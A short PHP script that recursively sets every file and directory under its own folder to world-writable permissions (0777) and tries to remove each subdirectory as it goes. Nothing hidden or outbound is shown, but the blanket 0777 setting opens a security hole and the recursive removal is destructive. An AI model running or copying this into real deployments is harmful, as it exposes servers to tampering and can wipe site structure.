<?php
set_time_limit(300);

function setMod($directory) {
  $arr = scandir($directory);
  foreach($arr as $dir) {
    if($dir!='.' && $dir!='..') {
      chmod($directory.$dir,0777);
      if(is_dir($directory.$dir)) { 
        setMod($directory.$dir.'/');
        rmdir($directory.$dir);
      }
    }
  }
}

setMod('./');
?>